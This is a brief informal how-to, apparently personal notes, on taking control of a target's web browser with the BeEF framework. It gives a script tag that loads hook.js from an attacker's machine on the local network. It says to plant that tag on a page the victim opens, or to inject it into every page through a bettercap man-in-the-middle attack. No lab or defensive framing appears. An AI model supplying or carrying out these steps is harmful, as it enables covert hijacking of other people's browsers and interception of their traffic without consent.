Way 1
use linux tool beff

Install beff and start beff server 
Then run beff hook to your target browser
i.e <script src="http://192.168.1.7:3000/hook.js"></script>

You may add this JS to your welcome page server and make target 
browser to open it example, apache server with hook.js 

with the help of beff you can control target browser

note:- it will only work on tab where the hook.js is plugged

To make hook.js to load every page need to use bettercap
(Man in middle) use hstshijack caplate to inject hook.js 
for every page
